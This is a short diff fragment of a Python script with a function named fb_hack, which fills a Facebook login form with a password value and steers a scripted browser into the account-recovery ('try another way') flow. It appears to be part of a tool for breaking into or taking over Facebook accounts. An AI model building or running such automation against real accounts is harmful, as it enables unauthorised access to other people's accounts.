@@ -74,7 +74,7 @@ def fb_hack(email, codex, search):
   print(forms)"""
   browser.select_form(nr=0)
   browser.form['pass'] = str(1)
-  browser.click('https://www.facebook.com/recover/initiate/?is_from_lara_screen=1')
+  browser.click(name=tryanotherway)
   """browser.select_form(nr=0)
   response1 = browser.response()
   soup = BeautifulSoup(response1, 'html.parser')
